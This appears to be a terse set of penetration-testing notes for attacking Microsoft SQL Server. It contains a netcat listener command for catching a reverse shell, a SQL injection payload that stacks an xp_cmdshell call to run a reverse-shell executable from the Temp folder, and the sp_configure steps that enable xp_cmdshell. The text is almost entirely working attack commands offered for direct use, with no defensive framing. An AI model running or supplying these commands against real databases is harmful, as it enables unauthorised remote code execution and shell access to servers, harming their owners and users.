nc -lvnp 443
execute the reverse shell and catch it with the listener.
' UNION SELECT NULL, NULL; EXEC xp_cmdshell 'cmd /c C:\Windows\Temp\reverse.exe
How to activate xp_cmdshell
USE master;
GO

EXECUTE sp_configure 'show advanced options', 1;
GO

RECONFIGURE;
GO

EXECUTE sp_configure 'xp_cmdshell', 1;
GO

RECONFIGURE;
GO

EXECUTE sp_configure 'show advanced options', 0;
GO

RECONFIGURE;
GO
